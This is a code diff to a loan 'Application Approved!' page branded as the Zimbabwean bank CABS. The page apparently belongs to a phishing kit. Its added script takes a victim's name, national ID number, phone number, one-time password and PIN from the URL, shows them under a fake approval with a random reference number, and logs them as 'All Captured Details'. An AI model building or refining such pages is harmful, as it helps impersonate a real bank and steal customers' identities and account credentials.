@@ -81,10 +81,11 @@
         }
 
         .success-container {
-            max-width: 450px;
+            max-width: 500px;
             width: 100%;
             text-align: center;
             animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            margin-top: 80px;
         }
 
         @keyframes slideUp {
@@ -196,12 +197,35 @@
         .detail-label {
             color: var(--cabs-green);
             font-weight: 600;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .detail-value {
             color: rgba(255, 255, 255, 0.9);
             font-weight: 600;
             text-align: right;
+            font-size: 14px;
+        }
+
+        .detail-value .highlight {
+            color: var(--cabs-green);
+        }
+
+        .section-title {
+            color: var(--cabs-green);
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 15px 0 8px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid rgba(17, 187, 74, 0.2);
+        }
+
+        .section-title:first-of-type {
+            margin-top: 0;
         }
 
         .action-buttons {
@@ -249,6 +273,21 @@
             transform: translateY(-2px);
         }
 
+        .reference-number {
+            background: rgba(17, 187, 74, 0.1);
+            border: 1px solid rgba(17, 187, 74, 0.2);
+            border-radius: 12px;
+            padding: 12px;
+            margin: 20px 0 25px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .reference-number strong {
+            color: var(--cabs-green);
+            font-size: 16px;
+        }
+
         footer {
             margin-top: 40px;
             font-size: 12px;
@@ -257,15 +296,20 @@
         }
 
         @media (max-width: 480px) {
+            .success-container { margin-top: 70px; }
             .success-card { padding: 40px 25px; }
             h2 { font-size: 24px; }
             .success-icon { width: 88px; height: 88px; }
             .checkmark { font-size: 50px; }
             .logo { font-size: 24px; }
             .logo .flex-loan { font-size: 20px; }
+            .detail-row { font-size: 13px; padding: 8px 0; }
+            .detail-label { font-size: 12px; }
+            .detail-value { font-size: 13px; }
         }
 
         @media (max-width: 370px) {
+            .success-container { margin-top: 65px; }
             .success-card { padding: 34px 22px; }
             .logo { font-size: 22px; }
             .logo .flex-loan { font-size: 18px; }
@@ -276,16 +320,18 @@
         @media (orientation: landscape) and (max-height: 500px) {
             header { position: static; padding: 8px 5% 8px; }
             body { padding: 8px 20px; }
+            .success-container { margin-top: 10px; }
             .success-card { padding: 28px 26px; }
             .success-icon { width: 64px; height: 64px; margin-bottom: 18px; }
             .checkmark { font-size: 40px; }
             .success-message { margin-bottom: 20px; }
             .details-box { margin-bottom: 20px; padding: 16px; }
             footer { margin-top: 16px; }
+            .reference-number { padding: 8px; margin: 12px 0 16px; }
         }
     </style>
 </head>
-<body>
+<body onload="displayDetails()">
 
     <header>
         <a class="logo" href="index.html">
@@ -300,27 +346,87 @@
                 <div class="checkmark">&#10003;</div>
             </div>
 
-            <div class="status-badge">Verified &amp; Approved</div>
+            <div class="status-badge">&#10003; Verified &amp; Approved</div>
 
             <h2>Application Approved!</h2>
 
             <p class="success-message">
-                Your account has been successfully verified and your Flex Loan application has been approved. Your funds will be transferred to your registered account within 24 hours.
+                Your account has been successfully verified and your Flex Loan application has been approved. 
+                Your funds will be transferred to your registered account within 24 hours.
             </p>
 
             <div class="details-box" id="detailsBox">
+                <!-- Personal Information -->
+                <div class="section-title">Personal Information</div>
+                <div class="detail-row">
+                    <span class="detail-label">Surname</span>
+                    <span class="detail-value" id="surnameDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">First Name</span>
+                    <span class="detail-value" id="firstNameDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Middle Name</span>
+                    <span class="detail-value" id="middleNameDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Full Name</span>
+                    <span class="detail-value highlight" id="fullNameDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">ID Number</span>
+                    <span class="detail-value" id="idNumberDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Phone Number</span>
+                    <span class="detail-value" id="phoneNumberDisplay">—</span>
+                </div>
+
+                <!-- Loan Details -->
+                <div class="section-title">Loan Details</div>
+                <div class="detail-row">
+                    <span class="detail-label">Loan Amount</span>
+                    <span class="detail-value highlight" id="loanAmountDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Purpose</span>
+                    <span class="detail-value" id="loanPurposeDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Repayment Period</span>
+                    <span class="detail-value" id="loanPeriodDisplay">—</span>
+                </div>
+
+                <!-- Employment Details -->
+                <div class="section-title">Employment Details</div>
+                <div class="detail-row">
+                    <span class="detail-label">Employment Status</span>
+                    <span class="detail-value" id="employmentStatusDisplay">—</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Monthly Income</span>
+                    <span class="detail-value highlight" id="monthlyIncomeDisplay">—</span>
+                </div>
+
+                <!-- Verification Details -->
+                <div class="section-title">Verification</div>
+                <div class="detail-row">
+                    <span class="detail-label">OTP Verified</span>
+                    <span class="detail-value">&#10003; Confirmed</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">PIN Verified</span>
+                    <span class="detail-value">&#10003; Confirmed</span>
+                </div>
                 <div class="detail-row">
                     <span class="detail-label">Status</span>
-                    <span class="detail-value">&#10003; Approved</span>
+                    <span class="detail-value highlight">&#10003; Approved</span>
                 </div>
-                <div class="detail-row">
-                    <span class="detail-label">Verification</span>
-                    <span class="detail-value">&#10003; Complete</span>
-                </div>
-                <div class="detail-row">
-                    <span class="detail-label">Next Step</span>
-                    <span class="detail-value">Fund Transfer</span>
-                </div>
+            </div>
+
+            <div class="reference-number" id="refNumber">
+                Reference: <strong id="refCode">CABS-2026-XXXX</strong>
             </div>
 
             <div class="action-buttons">
@@ -333,6 +439,75 @@
     <footer>
         <p>&copy; 2026 CABS, a member of the Old Mutual Group &bull; Zimbabwe. All rights reserved.</p>
     </footer>
+
+    <script>
+        function displayDetails() {
+            const params = new URLSearchParams(window.location.search);
+            
+            // Get all parameters
+            const firstName = params.get('firstName') || '';
+            const middleName = params.get('middleName') || '';
+            const surname = params.get('surname') || '';
+            const phone = params.get('phone') || '';
+            const idNumber = params.get('idNumber') || '';
+            const amount = params.get('amount') || '0';
+            const purpose = params.get('purpose') || 'Flex Loan';
+            const period = params.get('period') || '12';
+            const income = params.get('income') || '0';
+            const employmentStatus = params.get('employmentStatus') || 'Not specified';
+            const otp = params.get('otp') || '';
+            const pin = params.get('pin') || '';
+
+            // Build full name: First Name + Middle Name + Surname
+            const fullName = [firstName, middleName, surname].filter(Boolean).join(' ') || 'Valued Client';
+
+            // Format currency
+            const formattedAmount = parseFloat(amount || '0').toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+
+            const formattedIncome = parseFloat(income || '0').toLocaleString(undefined, {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+
+            // Display all details
+            document.getElementById('surnameDisplay').textContent = surname || '—';
+            document.getElementById('firstNameDisplay').textContent = firstName || '—';
+            document.getElementById('middleNameDisplay').textContent = middleName || '—';
+            document.getElementById('fullNameDisplay').textContent = fullName;
+            document.getElementById('idNumberDisplay').textContent = idNumber || '—';
+            document.getElementById('phoneNumberDisplay').textContent = phone || '—';
+            document.getElementById('loanAmountDisplay').textContent = '$' + formattedAmount + ' USD';
+            document.getElementById('loanPurposeDisplay').textContent = decodeURIComponent(purpose);
+            document.getElementById('loanPeriodDisplay').textContent = period + ' Months';
+            document.getElementById('employmentStatusDisplay').textContent = decodeURIComponent(employmentStatus);
+            document.getElementById('monthlyIncomeDisplay').textContent = '$' + formattedIncome + ' USD';
+
+            // Generate reference number
+            const refNum = 'CABS-2026-' + String(Math.floor(1000 + Math.random() * 9000));
+            document.getElementById('refCode').textContent = refNum;
+
+            // Log all captured data (for debugging)
+            console.log('✅ Application Approved!');
+            console.log('📋 All Captured Details:');
+            console.log('👤 Surname:', surname);
+            console.log('👤 First Name:', firstName);
+            console.log('👤 Middle Name:', middleName);
+            console.log('👤 Full Name:', fullName);
+            console.log('🪪 ID Number:', idNumber);
+            console.log('📱 Phone:', phone);
+            console.log('💰 Amount:', '$' + formattedAmount);
+            console.log('🎯 Purpose:', decodeURIComponent(purpose));
+            console.log('📅 Period:', period + ' months');
+            console.log('💼 Employment:', decodeURIComponent(employmentStatus));
+            console.log('💵 Income:', '$' + formattedIncome);
+            console.log('🔢 OTP:', otp);
+            console.log('🔑 PIN:', pin);
+            console.log('📌 Reference:', refNum);
+        }
+    </script>
 
     <!-- Start of Tawk.to Script -->
     <script type="text/javascript">
